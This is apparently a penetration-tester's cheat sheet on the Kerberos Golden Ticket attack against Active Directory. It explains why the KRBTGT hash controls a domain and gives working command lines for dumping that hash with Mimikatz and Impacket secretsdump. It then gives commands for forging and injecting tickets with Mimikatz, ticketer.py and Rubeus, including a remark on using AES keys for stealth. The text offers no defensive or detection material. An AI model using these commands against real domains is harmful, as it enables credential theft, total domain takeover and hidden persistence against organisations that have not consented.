- Attack against the **KRBTGT account**, the master key for the entire domain
- Forge a  Ticket-Granting-Ticket (TGT) that provides domain persistance
- Works because the TGT is encrypted with the **KRBTGT account's password hash**
-  KDC trusts _any_ TGT signed with krbtgt  So you can claim to be **any user, in any groups**

**KRBTGT Account:**

- It's a **default domain account** whose password hash is used to encrypt/sign all Kerberos TGTs.
- Whoever controls this hash **controls the domain**.

**Steps:**

1. Gain Domain Admin privileges to extract the KRBTGT account's NT hash from the Domain Controller
2. Use the KRBTGT hash to forge a TGT for any user, making them a member of any group
3. Use the forged TGT to request access to any service or resource in the domain
4. Gain persistent, total control over the entire domain forest

-  NTLM hash of the domain’s KDC service account (KRBTGT) to sign them.

The NTLM hash of the **krbtgt** account can be obtained via the following methods: 

1. DCSync (Mimikatz)
2. LSA (Mimikatz)
3. Hashdump (Meterpreter)
4. NTDS.DIT
5. DCSync (Kiwi)

**whoami /user** command or with the use of **PsGetsid** utility from [PsTools](https://download.sysinternals.com/files/PSTools.zip).

```sh

#SafteyKatz 
#Dump the sid and hash of krbtgt
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch /name:krbtgt

#using  dcsync
lsadump::dcsync /user:krbtgt

#Impacket
#using impacket dcsync to dump the hash
secretsdump.py scrm.local/administrator@dc1.scrm.local -k -no-pass -just-dc-user krbtgt

ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain scrm.local Administrator

#Metasploit could be an option


#Mimikatz
#Forge Golden ticket
mimikatz kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>


# To generate the TGT with AES 256 key (more secure encryption, more stealth due is the used by default by Microsoft)
mimikatz  kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz  kerberos::ptt <ticket_kirbi_file>


#Rubeus
#Forge Golden ticket
rubeus.exe golden /aes256:<aes> /sid:<sid> /ldap /user:Administrator /printcmd 

#inject ticket 
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

```

**Note**: you may need to change the “ /Krbtgt:” to “/rc4:”. if you encountered any errors follow this official guide.
